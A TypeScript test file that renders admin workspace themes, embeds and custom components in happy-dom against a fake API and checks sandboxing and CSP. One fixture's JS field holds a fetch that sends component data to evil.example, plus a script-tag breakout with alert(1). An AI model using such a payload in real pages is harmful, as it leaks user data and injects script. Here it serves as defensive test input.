import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { GlobalRegistrator } from "@happy-dom/global-registrator";
import type { PlatformBridge } from "@repo/admin/platform";
import {
  type Block,
  BUILTIN_THEMES,
  DEFAULT_APPEARANCE,
  VIEW_SOURCES,
  type ViewRow,
  viewQueryRequestSchema,
  type WorkspaceComponent,
  type WorkspacePage,
} from "@repo/schemas";
import { runViewQuery } from "@repo/utils/workspace-views";
import type { AppRouterInstance } from "next/dist/shared/lib/app-router-context.shared-runtime";
import type { ReactNode } from "react";
import { WEB_ADMIN_ROUTES } from "@/lib/admin-routes";

/*
 * Themes, embeds, custom components and page styles rendered by the shared
 * admin package in happy-dom against a fake API. Not a browser: nothing is
 * laid out and the effect canvas never draws.
 */

beforeAll(() => {
  GlobalRegistrator.register();
  Reflect.set(globalThis, "IS_REACT_ACT_ENVIRONMENT", true);
});

afterAll(async () => {
  await GlobalRegistrator.unregister();
});

const CARDS: ViewRow[] = [
  {
    id: "c1",
    ref: "entity:kanban-card:c1",
    values: { title: "Renew passport", done: false, due: "2026-11-02" },
  },
  {
    id: "c2",
    ref: "entity:kanban-card:c2",
    values: { title: "Buy tree", done: false, due: "2026-12-01" },
  },
  {
    id: "c3",
    ref: "entity:kanban-card:c3",
    values: { title: "Old thing", done: true },
  },
];

const christmas = BUILTIN_THEMES.find((t) => t.id === "builtin:christmas");
if (!christmas) throw new Error("christmas theme missing");

const COMPONENTS: Record<string, WorkspaceComponent> = {
  tasks: {
    id: "tasks",
    name: "Open tasks",
    description: "",
    icon: "icon:list-todo",
    kind: "spec",
    spec: {
      id: "root",
      type: "stack",
      children: [
        {
          id: "h",
          type: "heading",
          text: "Open {{tasks.total}}",
          level: 3,
        },
        {
          id: "l",
          type: "list",
          repeat: "tasks.rows",
          children: [{ id: "t", type: "text", text: "{{item.title | upper}}" }],
        },
        {
          id: "c",
          type: "countdown",
          value: "{{props.date}}",
          text: "left",
        },
        {
          id: "img",
          type: "image",
          href: "https://x.y/{{tasks.total}}.png",
        },
      ],
    },
    html: "",
    css: "",
    js: "",
    bindings: [
      {
        name: "tasks",
        kind: "view",
        view: {
          source: "kanban-cards",
          layout: "table",
          filters: [{ field: "done", op: "is", value: false }],
          sort: [{ field: "due", dir: "asc" }],
          limit: 25,
        },
      },
    ],
    props: [{ name: "date", label: "", type: "date", default: "2099-01-01" }],
    height: 240,
    createdBy: "conversation:abc",
    createdAt: "2026-11-01T00:00:00.000Z",
    updatedAt: "2026-11-01T00:00:00.000Z",
  },
  frame: {
    id: "frame",
    name: "Frame",
    description: "",
    icon: null,
    kind: "html",
    spec: null,
    html: "<p>hi</p>",
    css: "p{color:var(--accent)}",
    js: "fetch('https://evil.example/'+JSON.stringify(component.data))</script><script>alert(1)",
    bindings: [],
    props: [],
    height: 120,
    createdBy: "owner",
    createdAt: "2026-11-01T00:00:00.000Z",
    updatedAt: "2026-11-01T00:00:00.000Z",
  },
};

function respond(body: object): Response {
  return new Response(JSON.stringify(body), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
}

async function fakeApi(
  input: RequestInfo | URL,
  init?: RequestInit,
): Promise<Response> {
  const url = new URL(String(input), "http://localhost");
  if (url.pathname.endsWith("/workspace/appearance")) {
    return respond({
      appearance: {
        ...DEFAULT_APPEARANCE,
        themeId: "builtin:sage",
        schedule: [
          {
            id: "s1",
            themeId: "builtin:christmas",
            from: "2000-01-01",
            to: "2999-12-31",
            label: "",
          },
        ],
        modules: { inbox: { label: "Mail", icon: "icon:mail:red" } },
      },
      themes: BUILTIN_THEMES,
    });
  }
  const component = url.pathname.match(/\/workspace\/components\/(\w+)$/);
  if (component?.[1]) {
    const found = COMPONENTS[component[1]];
    return found
      ? respond({ component: found })
      : new Response("{}", { status: 404 });
  }
  if (url.pathname.endsWith("/workspace/views/query")) {
    const body = viewQueryRequestSchema.parse(JSON.parse(String(init?.body)));
    if (!body.view) throw new Error("inline views only");
    return respond(
      runViewQuery(VIEW_SOURCES[body.view.source], CARDS, body.view, {
        today: body.today ?? "2026-11-01",
      }),
    );
  }
  return new Promise<Response>(() => {});
}

const platform: PlatformBridge = {
  openExternal: () => {},
  navigate: () => {},
  copyText: async () => {},
  notify: () => {},
  downloadFile: async () => {},
};

function page(
  blocks: Block[],
  extra: Partial<WorkspacePage> = {},
): WorkspacePage {
  return {
    id: "p1",
    title: "Holidays",
    icon: "icon:tree-pine:green",
    parentId: null,
    order: 0,
    blocks,
    fullWidth: false,
    locked: false,
    createdAt: "2026-10-01T00:00:00.000Z",
    updatedAt: "2026-10-01T00:00:00.000Z",
    deletedAt: null,
    ...extra,
  };
}

async function settle() {
  for (let i = 0; i < 25; i++) await new Promise((r) => setTimeout(r, 10));
}

async function mount(render: () => Promise<ReactNode>, pages: WorkspacePage[]) {
  const { act } = await import("react");
  const { createRoot } = await import("react-dom/client");
  const { AdminProvider } = await import("@repo/admin/provider");
  const { createAdminClient } = await import("@repo/admin/client");
  const { useWorkspaceStore } = await import("@repo/admin/workspace/store");
  const { seedWorkspace } = await import("@repo/admin/workspace/seed");
  useWorkspaceStore.setState({
    ready: true,
    workspace: {
      ...seedWorkspace(),
      pages: Object.fromEntries(pages.map((p) => [p.id, p])),
    },
    loaded: Object.fromEntries(pages.map((p) => [p.id, 1])),
  });
  const client = createAdminClient({
    baseUrl: "/api/admin",
    fetchImpl: fakeApi,
  });
  const node = await render();
  const host = document.createElement("div");
  document.body.appendChild(host);
  const root = createRoot(host);
  await act(async () => {
    root.render(
      <AdminProvider value={{ client, platform, routes: WEB_ADMIN_ROUTES }}>
        {node}
      </AdminProvider>,
    );
    await settle();
  });
  return {
    host,
    unmount: () =>
      act(async () => {
        root.unmount();
        host.remove();
        await settle();
      }),
  };
}

describe("themes", () => {
  test("a schedule entry covering today wins and is applied to <html>", async () => {
    const { ThemeRoot } = await import(
      "@repo/admin/workspace/appearance/theme-root"
    );
    const view = await mount(async () => <ThemeRoot />, []);
    const root = document.documentElement;
    expect(root.dataset.theme).toBe("builtin:christmas");
    expect(root.style.getPropertyValue("--accent")).toBe(
      christmas.colors.accent,
    );
    expect(root.style.getPropertyValue("--primary")).toBe("#b3261e");
    expect(root.style.getPropertyValue("--card")).toBe(
      christmas.colors.background,
    );
    expect(root.classList.contains("dark")).toBe(false);
    expect(document.getElementById("workspace-theme")?.textContent).toContain(
      "--theme-font-heading",
    );
    await view.unmount();
    expect(root.style.getPropertyValue("--accent")).toBe("");
    expect(document.getElementById("workspace-theme")).toBeNull();
  });

  test("module labels and icons from appearance dress the nav", async () => {
    const { useAppearanceStore } = await import(
      "@repo/admin/workspace/appearance/store"
    );
    const { customizeNav } = await import(
      "@repo/admin/workspace/appearance/customize-nav"
    );
    const { workspaceNav } = await import("@repo/admin/workspace/refs");
    const nav = customizeNav(
      workspaceNav(WEB_ADMIN_ROUTES),
      useAppearanceStore.getState().appearance,
    );
    expect(nav.getModule("inbox")?.label).toBe("Mail");
    expect(nav.sections.length).toBeGreaterThan(0);
  });
});

describe("blocks", () => {
  test("embeds resolve providers; components bind live data", async () => {
    const { FlowEditor } = await import(
      "@repo/admin/workspace/editor/flow-editor"
    );
    const pages = [
      page([
        {
          id: "e1",
          type: "embed",
          url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
          caption: [],
        },
        {
          id: "e2",
          type: "embed",
          url: "https://example.com/page",
          caption: [],
        },
        {
          id: "k1",
          type: "component",
          componentId: "tasks",
          props: { date: "2099-01-03" },
        },
        { id: "k2", type: "component", componentId: "frame", props: {} },
        { id: "k3", type: "component", componentId: "gone", props: {} },
      ]),
    ];
    const view = await mount(
      async () => <FlowEditor pageId="p1" editable={false} />,
      pages,
    );
    const { host } = view;
    const frames = [...host.querySelectorAll("iframe")];
    const youtube = frames.find((f) => f.src.includes("youtube"));
    expect(youtube?.src).toBe(
      "https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ",
    );
    const external = frames.find((f) => f.src.startsWith("https://example"));
    expect(external?.getAttribute("sandbox")).not.toContain("same-origin");

    expect(host.textContent).toContain("Open 2");
    expect(host.textContent).toContain("RENEW PASSPORT");
    expect(host.textContent).toContain("BUY TREE");
    expect(host.textContent).not.toContain("OLD THING");
    expect(host.querySelector("img[src*='x.y']")).toBeNull();

    const sandboxed = frames.find((f) => f.getAttribute("srcdoc") !== null);
    const doc = sandboxed?.getAttribute("srcdoc") ?? "";
    expect(sandboxed?.getAttribute("sandbox")).toBe("allow-scripts");
    expect(doc).toContain("default-src 'none'");
    expect(doc).not.toContain("</script><script>alert(1)");
    await view.unmount();
  });

  test("a page's style dresses it and its theme takes over while open", async () => {
    const { WorkspacePageView } = await import(
      "@repo/admin/workspace/page-view"
    );
    const pages = [
      page([], {
        style: {
          cover: "gradient:festive",
          width: "narrow",
          themeId: "builtin:midnight",
          font: "serif",
        },
      }),
    ];
    const { ThemeRoot } = await import(
      "@repo/admin/workspace/appearance/theme-root"
    );
    const { AppRouterContext } = await import(
      "next/dist/shared/lib/app-router-context.shared-runtime"
    );
    const { PathnameContext, SearchParamsContext } = await import(
      "next/dist/shared/lib/hooks-client-context.shared-runtime"
    );
    const router: AppRouterInstance = {
      bfcacheId: "test",
      back: () => {},
      forward: () => {},
      refresh: () => {},
      push: () => {},
      replace: () => {},
      prefetch: () => {},
    };
    const view = await mount(
      async () => (
        <AppRouterContext.Provider value={router}>
          <PathnameContext.Provider value="/admin/dashboard/page">
            <SearchParamsContext.Provider value={new URLSearchParams("id=p1")}>
              <ThemeRoot />
              <WorkspacePageView pageId="p1" />
            </SearchParamsContext.Provider>
          </PathnameContext.Provider>
        </AppRouterContext.Provider>
      ),
      pages,
    );
    const body = view.host.querySelector("[data-slot='page-body']");
    expect(body?.querySelector(".max-w-3xl")).not.toBeNull();
    expect(body?.innerHTML).toContain("repeating-linear-gradient");
    expect(document.documentElement.dataset.theme).toBe("builtin:midnight");
    expect(document.documentElement.classList.contains("dark")).toBe(true);
    await view.unmount();
  });
});
